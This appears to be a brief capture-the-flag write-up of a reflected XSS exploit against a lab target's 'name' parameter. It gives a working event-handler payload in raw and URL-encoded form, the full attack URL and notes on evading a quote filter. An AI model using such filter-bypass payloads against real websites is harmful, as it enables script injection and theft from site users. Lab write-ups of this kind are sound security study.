# X-008-24 EXP

- Target: `http://ip32773`
- Vulnerability: Reflected XSS via `GET /page?name=...` (event handler bypass)
- Working payload (raw):
  - `<input autofocus onfocus=alert(/XSS/.source)>`
- Working payload (URL-encoded):
  - `%3Cinput%20autofocus%20onfocus%3Dalert%28%2FXSS%2F.source%29%3E`
- Full URL:
  - `http://ip32773/page?name=%3Cinput%20autofocus%20onfocus%3Dalert%28%2FXSS%2F.source%29%3E`
- Returned flag:
  - `FLAG`

Notes:
- Server blocks `'` but not `onfocus`; PhantomJS triggers focus events automatically (see `check.js`).
- `/XSS/.source` yields string `"XSS"` without needing quotes.
